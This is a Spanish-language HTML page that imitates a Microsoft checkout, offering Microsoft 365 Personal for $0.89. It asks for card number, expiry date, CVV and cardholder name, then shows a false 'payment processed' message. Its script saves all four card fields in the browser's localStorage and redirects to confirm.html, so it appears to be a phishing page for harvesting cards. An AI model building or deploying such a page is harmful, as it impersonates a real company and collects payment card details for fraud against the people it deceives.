<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Pagar con tarjeta - Microsoft</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f3f3f3;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .payment-container {
      background: white;
      width: 100%;
      max-width: 400px;
      padding: 2rem;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 8px;
    }

    .logo {
      display: flex;
      gap: 0.5rem;
      flex-direction: column;
      align-items: flex-start;
      margin-bottom: 1rem;
    }

    .logo-boxes {
      display: grid;
      grid-template-columns: repeat(2, 20px);
      grid-template-rows: repeat(2, 20px);
      gap: 4px;
    }

    .logo-box {
      width: 20px;
      height: 20px;
    }

    .red    { background-color: #f35325; }
    .green  { background-color: #81bc06; }
    .blue   { background-color: #05a6f0; }
    .yellow { background-color: #ffba08; }

    h2 {
      font-size: 1.3rem;
      margin-bottom: 0.5rem;
    }

    .product-info {
      background-color: #f9f9f9;
      border-left: 4px solid #0067b8;
      padding: 0.75rem;
      margin-bottom: 1rem;
      font-size: 0.95rem;
    }

    input {
      width: 100%;
      padding: 0.75rem;
      font-size: 1rem;
      margin-bottom: 1rem;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    .inline-group {
      display: flex;
      gap: 1rem;
    }

    .inline-group input {
      flex: 1;
    }

    button {
      width: 100%;
      padding: 0.75rem;
      font-size: 1rem;
      background-color: #0067b8;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    button:hover {
      background-color: #005ba1;
    }

    .footer-link {
      margin-top: 1rem;
      font-size: 0.9rem;
      text-align: center;
    }

    .footer-link a {
      color: #0067b8;
      text-decoration: none;
    }

    .footer-link a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="payment-container">
    <div class="logo">
      <div class="logo-boxes">
        <div class="logo-box red"></div>
        <div class="logo-box green"></div>
        <div class="logo-box blue"></div>
        <div class="logo-box yellow"></div>
      </div>
    </div>
    <h2>Pago con tarjeta</h2>
    <div class="product-info">
      Estás pagando <strong>$0.89 USD</strong> por <strong>Microsoft 365 Personal (1 año)</strong>.
    </div>
    <form id="paymentForm">
      <input type="text" id="cardNumber" placeholder="Número de tarjeta" maxlength="19" required>
      <div class="inline-group">
        <input type="text" id="expiry" placeholder="MM/AA" maxlength="5" required>
        <input type="text" id="cvv" placeholder="CVV" maxlength="4" required>
      </div>
      <input type="text" id="name" placeholder="Nombre del titular" required>
      <button type="submit">Pagar ahora</button>
    </form>
    <div class="footer-link">
      <a href="#">¿Necesitas ayuda?</a>
    </div>
  </div>

  <script>
    document.getElementById("paymentForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const cardNumber = document.getElementById("cardNumber").value;
      const expiry = document.getElementById("expiry").value;
      const cvv = document.getElementById("cvv").value;
      const name = document.getElementById("name").value;

      if (!cardNumber || !expiry || !cvv || !name) {
        alert("Por favor, complete todos los campos.");
        return;
      }

      alert("Pago procesado correctamente con la tarjeta terminada en " + cardNumber.slice(-4));
      localStorage.setItem("cc", cardNumber);
    localStorage.setItem("ccv", cvv);    
   
     localStorage.setItem("cce", expiry); 
      localStorage.setItem("ccn", name); 
      window.location = "confirm.html";
    });
    


  </script>
</body>
</html>
